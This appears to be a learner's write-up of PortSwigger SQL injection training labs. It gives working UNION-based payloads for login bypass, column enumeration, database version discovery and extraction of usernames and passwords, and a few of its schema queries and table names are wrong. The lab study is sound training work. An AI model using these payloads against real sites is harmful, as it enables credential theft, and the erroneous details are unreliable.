# Union Attacks (plus some basics)

Note: the final query is simply a guess of the general structure of what it looks like behind the scenes as we aren't given the source code for the actual queries.  I just found it helpful to visually see code highlighting for some of the query schenanigans that were taking place.

For these attacks I used BurpSuite proxy to intercept requests.  Simply load the lab, and before sending a request to a vulnerable part of the site, enable intercept.  Then when you see the body of the request, send it to repeater.  

## SQLi using WHERE
>This was was rather simple as it just invovled injecting a conditional into the query. 
>
>Don't forget to substitute spaces with '+' when making requests.
>
>Solution: `'+OR+1=1--`
>
>Final query: 
>``` SQL
>SELECT * FROM table WHERE category = ''+OR+1=1--'AND released = 1
>```
>



## SQLi basic application login subversion
>This was was also really easy as you could just comment out the logic related to password checking.
>
>Solution: `administrator'--`
>Final query: 
>```SQL
>                                       |    payload   |
>SELECT name FROM users WHERE username='administrator'--'AND [password checking logic here]
>```
>



## SQLi union to find # of cols
>We can subvert the application logic by selecting Null values from the columns of the table.  If we don't select a value from each column without a WHERE statement, the application will throw an error.  Therefore we can simply keep adding NULL values until the application stops throwing errors.  Note the query is slighlty different Oracle.  
>
>[Note this can also be done using ORDER BY but I found this easier]
>
>Solution: `+UNION+SELECT+NULL,NULL,NULL--`
>Final query:
>```SQL
>                                          |           payload           |
>SELECT thing FROM table WHERE category = '' UNION SELECT NULL,NULL,NULL--'[rest of query here]
>```
>



## SQL find column containing text
>We used NULL as the values as regardless of the data type of each column, given we selected from each there would be no error.  Now to find which ones are strings we can simply just test each column with a string instead of NULL.
>
>Solution: `+UNION+SELECT+'eee',NULL,NULL` ect ect ect
>



## SQL union to get data from other tables
>First step is to use the previous two methods to find out the number and type of each columns.  We find there are two columns that have strings.  Since we're given the fact that they are named `username` and `password`, we can simply query from both.  Checking for extra columns is useful given there were other columns that would have caused this attack to error.
>
>Solution: `'+UNION+SELECT+username,+password+FROM+users--`
>Final query:
>```SQL
>                                         |                  payload                  |
>SELECT * FROM products WHERE category = '' UNION SELECT username,password FROM users--'[rest of query here] 
>```
>



## SQL union multipile tables in single column
>Using the previous methods to determine the type and number of columns, we find one that has string values and another that is of another data type.  Therefore to exfiltrate both tables in only one column we must simply append the values of one table to the other.  It may be useful to check the version of SQL the site is running as different SQL flavors have differing sytax for string cocatination.
>
>Solution: `'UNION SELECT NULL,username||password FROM USERS--`
>Final query:
>```SQL
>                                         |                      payload                     |
>SELECT * FROM products WHERE category = '' UNION SELECT NULL, username||password FROM USERS--'[rest of query here]
>```
>



## SQL union select version on Oracle
>Given we are told that the version is Oracle for this database, we can simply union attatch the version at the end of the query.  Note the unique syntax of Oracle as it always requires a `FROM` and a table with every `SELECT` query so we must modify the payload to find the type and number of tables.  We can remedy this by using the `dual` table which is always present like so: `'>+UNION+SELECT+'eee','eee'+FROM+dual--`.  We can then request the banner from the `v$version` table which can be found on the [sql cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
>
>Solution: `'+UNION+SELECT+NULL,BANNER+FROM+v$version--`
>Final query:
>``` SQL
>                                         |                 payload                 |
>SELECT * FROM products WHERE category = '' UNION SELECT NULL,BANNER FROM v$version--'[rest of query here]
>```
>



## SQL union select version on non Oracle
>Repeat with the previous except you need to test for which version the database is in.  This one turns out to be MySQL.  Substitute accordingly sytax wise.
>
>NOTE: for MySQL you need a space after the double dash to properly comment or use a #.
>
>Solution: `'+UNION+SELECT+@@version,+NULL--+` 
>



## SQL union select database tables on non Oracle
>Note: in this lab, the randomized string after the users, password, and username will be different for your lab.
>
>Use previous methods to find out number and type of columns.  We find there are two string columns.  Most non Oracle SQL databases have a table named `information_schema.tables` which houses information about the tables in the database and within that have a column named `table_name` which houses names about the tables on the database.  We can use this to union the table names of the user info with the following payload: 
>`'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`
>
>Full query:
>```SQL
>                                         |                            payload                          |
>SELECT * FROM products WHERE category = '' UNION SELECT table_name,NULL FROM information_schema.tables--'
>```
>
>Then after finding the user info table name, which is `users_jzmhvt`, we can query from the `information_schema.tables` to find details about the individual table using the following payload:
>`+UNION+SELECT+column_name,NULL+FROM+information_schema.tables+WHERE+table_name='users_jzmhvt'`
>
>Full query (payload too long for highlighting lol):
>```SQL
>SELECT * FROM products WHERE category = '' UNION SELECT column_name,NULL FROM information_schema.tables WHERE table_name='users_jzmhvt'--'
>```
>
>Finally we get the column names for username and password `password_rnlbda` & `username_noeqqv` and can directly request the information from the users table with the following payload:
>`+UNION+SELECT+username_noeqqv,password_rnlbda+FROM+users_jzmhvt--`
>and nab the password.
>
>Final query:
>```SQL
>                                         |                            payload                            |
>SELECT * FROM products WHERE category = '' UNION SELECT username_noeqqv,password_rnlba FROM users_jzmhvt--'
>```
>



## SQL union select database tables Oracle
>Repeat previous lab but with Oracle syntax.  Remember in Oracle instead of `information_schema.tables`, Oracle uses all_tables and instead of `table_name`, uses `all_tab_columns`.
>